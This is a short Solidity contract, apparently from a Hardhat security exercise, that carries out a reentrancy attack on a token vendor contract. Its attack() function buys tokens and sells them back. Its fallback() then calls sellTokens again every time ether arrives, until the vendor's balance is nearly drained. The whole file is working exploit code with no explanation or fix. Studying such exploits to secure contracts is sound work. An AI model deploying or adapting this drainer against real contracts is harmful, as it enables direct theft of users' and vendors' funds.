// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "hardhat/console.sol";
import "../FHCWVendor.sol";

contract SC01 {
    FHCWVendor public vendor;
    address public owner;
    uint256 private tokensToSell;

    constructor(address payable _vendorAddress) {
        vendor = FHCWVendor(_vendorAddress);
        tokensToSell = 100;
        owner = msg.sender;
    }

    fallback() external payable {
        require(address(vendor).balance >= (tokensToSell / 1000) * (10 ** 18) + (500 gwei), "Attack over");
        console.log("Remaining balance: ", address(vendor).balance);
        console.log("Fallback called");
        vendor.sellTokens(tokensToSell);
    }

    function attack() public payable {
        console.log("Attack Value sent: ", msg.value);
        console.log("Attack Limit: ", (tokensToSell / 1000) * (10 ** 18) + (500 gwei));

        require(msg.value >= 1 ether, "1 or more ether is needed to attack");
        vendor.buyTokens{value: msg.value}();
        vendor.sellTokens(tokensToSell);
    }
}